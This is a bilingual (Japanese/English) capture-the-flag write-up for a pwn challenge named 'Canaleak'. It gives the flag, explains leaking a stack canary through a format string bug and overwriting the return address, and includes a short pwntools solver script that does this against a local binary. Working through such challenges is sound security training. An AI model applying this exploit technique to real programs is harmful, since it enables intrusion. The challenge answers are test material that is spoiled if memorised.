---
title: "06. Canaleak"
level: 3
flag: "FLAG{N0PE!}"
writer: "EBeb"
badge: true
---
# 06. Canaleak

## 問題文

Canaryはスタックを保護するために与えられたメモリ上のランダムな値である。
この値が変わるとプログラムは異常終了される。

`nc canaleak-pwn.wanictf.org 9006`

______________________________________________________________________

Canary is a random value assigned in memory to protect the stack.
When this value changes, the program terminates abnormally.


## FLAG

`FLAG{N0PE!}`

## 解法-日本語

Canaryの突破方法はいくつかあるが、今回はformat string bugを用いてCanaryの値を直接流出させ、それお含めてreturn addressを書き換える。
payloadは「ダミー+Canary+rbp用ダミー+win関数のアドレス」で構成する。
入力をscanfで受けてるため、次のバイトが入力できないため、Canaryに次のバイトが含まれている場合はCheckerが動かない不具合がありました。
`0x09 0x0A 0x0B 0x0C 0x0D 0x20` 


## WriteUp
There are several ways to break through `Canary`, but this time we will use a `format string bug` to directly leak the value of Canary and rewrite the return address including it. The payload is composed of `dummy + Canary + dummy for rbp + address of win function`. Since the input is received by `scanf`, there was a bug where the `Checker` did not work if the one of the following bytes is included in Canary because they could not be entered using scanf. 
`0x09 0x0A 0x0B 0x0C 0x0D 0x20`
### Solver

```
from pwn import *

win=p64(0x401245)

pc = process('./a.out')
print(pc.recvuntil(': '))
pc.sendline(b"%9$p")
canary=int(pc.recvuntil(b"\n")[:-1],16)
log.info('Canary : '+hex(canary))
pc.sendline(b'A'*24+p64(canary)+p64(0)+win)
#gdb.attach(pc,'b *0x4012e8')
pc.sendline(b'YES')
pc.interactive()
```
